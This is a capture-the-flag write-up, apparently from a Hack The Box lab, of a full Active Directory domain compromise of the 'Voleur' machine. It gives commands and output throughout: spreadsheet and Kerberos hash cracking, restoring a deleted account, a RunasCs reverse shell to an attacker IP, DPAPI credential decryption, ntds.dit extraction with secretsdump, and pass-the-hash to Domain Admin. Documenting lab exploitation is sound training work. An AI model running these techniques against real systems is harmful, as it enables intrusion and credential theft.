@@ -1,0 +1,215 @@
+Title: Voleur
+Tag: HTB
+Date: 2025-07-06
+
+# Overview
+
+Voleur was a Windows Active Directory box reached with a starter set of low-privileged credentials. An encrypted spreadsheet pulled from an SMB share cracks open with rockyou.txt and leaks a list of accounts, job notes, and service-account passwords - including a hint that one service account's password had to be "asked for," which turns out to mean it's Kerberoastable. That service account's shell exposes an LDAP service account whose privileges are enough to restore a deleted, disabled user, whose old password still works. DPAPI-protected credentials sitting in that restored user's archived profile leak a third-line support engineer's password, whose share hides an SSH private key. That key drops into a Linux (WSL) side of the box running on a non-standard SSH port, which has read access to a mounted Windows AD backup - an `ntds.dit` and `SYSTEM` hive pair that `secretsdump.py` turns into every domain hash, including the Administrator's, for a straight pass-the-hash to Domain Admin.
+
+## Recon
+
+```
+> nmap -sC -sV -p- 10.10.11.76
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 03:01:35Z)
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
+Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
+```
+
+Standard DC fingerprint (Kerberos, LDAP, SMB, WinRM) - but nmap's own OS/service detection flags both Windows *and* Linux, and there's an OpenSSH server on the distinctly non-default port 2222. That mismatch turned out to matter a lot later: the box is a Windows DC with a WSL (Windows Subsystem for Linux) instance also reachable over SSH.
+
+Kerberos needs clock sync, so the system clock was faked against the DC before requesting any tickets:
+
+```
+> faketime -f $(ntpdate -q voleur.htb | awk '{print $4}') bash
+> impacket-getTGT 'voleur.htb/ryan.naylor:HollowOct31Nyt'
+> export KRB5CCNAME=ryan.naylor.ccache
+> bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.10.11.76 -c All --zip
+> evil-winrm -i 10.10.11.76 -u ryan.naylor -p 'HollowOct31Nyt'
+```
+
+The given `ryan.naylor` credentials authenticate cleanly and even get a WinRM shell, but BloodHound didn't surface a fast path to DA from that account, so the next step was pulling on whatever `ryan.naylor` could reach over SMB instead.
+
+## Credential Discovery via SMB - Access_Review.xlsx
+
+```
+> nxc smb DC.voleur.htb -d voleur.htb --use-kcache --shares
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+Finance
+HR
+IPC$            READ            Remote IPC
+IT              READ
+NETLOGON        READ            Logon server share
+SYSVOL          READ            Logon server share
+```
+
+`IT` was readable. Browsing it with `smbclient.py` and descending into `First-Line Support` turned up a password-protected spreadsheet:
+
+```
+> smbclient.py -k 'VOLEUR.HTB/ryan.naylor@dc.voleur.htb' -no-pass
+shares
+use IT
+cd First-Line Support
+get Access_Review.xlsx
+```
+
+```
+> office2john Access_Review.xlsx > document.hash
+> john --wordlist=/usr/share/wordlists/rockyou.txt document.hash
+football1
+```
+
+The decrypted workbook was effectively a staff directory with notes attached to each account:
+
+```
+User,Job Title,Permissions,Notes
+Ryan.Naylor,First-Line Support Technician,SMB,Has Kerberos Pre-Auth disabled temporarily to test legacy systems.
+Marie.Bryant,First-Line Support Technician,SMB,
+Lacey.Miller,Second-Line Support Technician,Remote Management Users,
+Todd.Wolfe,Second-Line Support Technician,Remote Management Users,Leaver. Password was reset to NightT1meP1dg3on14 and account deleted.
+Jeremy.Combs,Third-Line Support Technician,Remote Management Users.,Has access to Software folder.
+Administrator,Administrator,Domain Admin,Not to be used for daily tasks!
+
+Service Accounts,,,
+svc_backup,,Windows Backup,Speak to Jeremy!
+svc_ldap,,LDAP Services,P/W - M1XyC9pW7qT5Vn
+svc_iis,,IIS Administration,P/W - N5pXyW1VqM7CZ8
+svc_winrm,,Remote Management,Need to ask Lacey as she reset this recently.
+```
+
+`ryan.naylor`'s disabled pre-auth note stood out as a possible AS-REP roast angle, but with valid credentials already in hand it didn't lead anywhere further. The more useful lead was `svc_winrm`: no password was written down for it, only a note to "ask Lacey," which was a strong hint that account needed a different attack path rather than a leaked plaintext.
+
+## Foothold - Kerberoasting svc_winrm
+
+`svc_winrm` runs a service with a registered SPN, which made it kerberoastable using the already-authenticated `ryan.naylor` session:
+
+```
+$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$e0d129b148387315506ffe9407e3ccd5$a5716291...(truncated)
+```
+
+```
+> hashcat -a 0 -m 13100 hash.txt rockyou.txt
+svc_winrm:AFireInsidedeOzarctica980219afi
+```
+
+```
+> impacket-getTGT 'voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi'
+> export KRB5CCNAME=svc_winrm.ccache
+> evil-winrm -i dc.voleur.htb -u svc_winrm -r voleur.htb
+```
+
+This landed a shell as `svc_winrm`. A WinPEAS pass turned up nothing further, and DPAPI blobs on this account didn't decrypt against any password gathered so far - so the DPAPI angle was parked until a more promising account showed up.
+
+## Lateral Movement - Restoring todd.wolfe via svc_ldap
+
+The spreadsheet's `svc_ldap` credentials (`M1XyC9pW7qT5Vn`) grant enough LDAP privilege to manipulate directory objects, including restoring soft-deleted ones. `Todd.Wolfe` was noted as a deleted leaver account whose reset password (`NightT1meP1dg3on14`) was still sitting in the spreadsheet - restoring the account effectively resurrects a working credential:
+
+```
+As svc_ldap:
+Get-ADObject -Filter 'samAccountName -eq "todd.wolfe"' -IncludeDeletedObjects | Restore-ADObject
+```
+
+```
+> .\RunasCs.exe todd.wolfe "NightT1meP1dg3on14" powershell.exe -r 10.10.14.121:7777
+```
+
+With `todd.wolfe` restored and the leaked password still valid, `RunasCs.exe` was used from the `svc_winrm` shell to spawn a reverse shell running as `todd.wolfe`.
+
+## DPAPI Secrets Extraction - Credentials for jeremy.combs
+
+`todd.wolfe`'s archived profile (kept around after the account was disabled rather than deleted) still had its DPAPI masterkey and a stored generic credential:
+
+```
+C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3
+C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88
+```
+
+```
+> impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -password 'NightT1meP1dg3on14' -sid S-1-5-21-3927696377-1337352550-2781715495-1110
+Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+```
+
+```
+> impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
+[CREDENTIAL]
+Target      : Domain:target=Jezzas_Account
+Username    : jeremy.combs
+Unknown     : qT3V9pLXyN7W4m
+```
+
+The DPAPI-decrypted blob was really Todd's saved login for a coworker's account - `jeremy.combs:qT3V9pLXyN7W4m` - a credential he apparently wasn't supposed to have stashed away.
+
+## Lateral Movement - SSH as svc_backup (WSL Root)
+
+```
+> impacket-getTGT 'voleur.htb/jeremy.combs:qT3V9pLXyN7W4m'
+> export KRB5CCNAME=jeremy.combs.ccache
+> evil-winrm -i dc.voleur.htb -u jeremy.combs -r voleur.htb
+```
+
+`jeremy.combs`, per the spreadsheet notes, had access to the Third-Line Support software folder. Browsing it turned up an SSH private key:
+
+```
+v> cd 'C:\IT\Third-Line Support'
+v> download id_rsa
+```
+
+This is where the earlier port-2222 SSH service and the "Windows *and* Linux" nmap fingerprint paid off - the key authenticated to a WSL environment running alongside the DC, as the `svc_backup` account referenced in the spreadsheet ("Speak to Jeremy!"):
+
+```
+> ssh -p 2222 -i ./id_rsa svc_backup@10.10.11.76
+> sudo -i
+```
+
+`sudo -i` dropped straight into a root shell - but it's root inside WSL, not the Windows domain controller itself.
+
+## Domain Compromise - ntds.dit Extraction and Pass-the-Hash
+
+WSL's root filesystem has the Windows drive mounted at `/mnt/c`, and that mount included a backup of the AD database sitting under the Third-Line Support share's Backups folder:
+
+```
+> scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/Active Directory/ntds.dit" .
+> scp -i id_rsa -P 2222 svc_backup@voleur.htb:"/mnt/c/IT/Third-Line Support/Backups/registry/SYSTEM" .
+```
+
+With both the database and its matching `SYSTEM` registry hive, every domain account hash can be extracted offline:
+
+```
+> secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
+voleur.htb\ryan.naylor:1103:...:3988a78c5a072b0a84065a809976ef16:::
+voleur.htb\jeremy.combs:1109:...:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
+voleur.htb\svc_winrm:1601:...:5d7e37717757433b4780079ee9b1d421:::
+Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
+```
+
+The Administrator's NT hash is enough for a straight pass-the-hash to a Kerberos ticket and a shell as Domain Admin:
+
+```
+> impacket-getTGT -dc-ip 10.10.11.76 'voleur.htb/Administrator' -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
+> export KRB5CCNAME=Administrator.ccache
+> evil-winrm -i dc.voleur.htb -u Administrator -r voleur.htb
+```
+
+Root shell.
+
+## Takeaways
+
+- Encrypted "internal" spreadsheets on a readable SMB share are still just office documents - `office2john` + rockyou cracked this one in seconds and it turned out to be a password list in disguise.
+- A note like "ask so-and-so for the password" instead of a plaintext password is often a tell that the account is meant to be reached a different way - here, kerberoasting, since the account had a registered SPN.
+- Deleted-but-not-purged AD objects can be restored by anyone with the right LDAP rights, and a restored account brings its last known password back with it - "deleted" doesn't mean "the credential stopped working."
+- DPAPI-protected credentials survive in archived/disabled user profiles as long as the masterkey and the account's old password are both available, and they're a common place for one user's saved login for *another* account to leak sideways.
+- Mixed Windows/Linux fingerprints from a port scan (an extra SSH service, unusual ports, dual OS CPEs in an nmap result) are worth taking seriously - here it meant a whole separate WSL filesystem with its own privilege boundary, reachable with a leaked SSH key.
+- A network backup share is only as safe as its ACLs - a copy of `ntds.dit` alongside its `SYSTEM` hive is equivalent to full domain compromise the moment both files are readable by an attacker-controlled account.
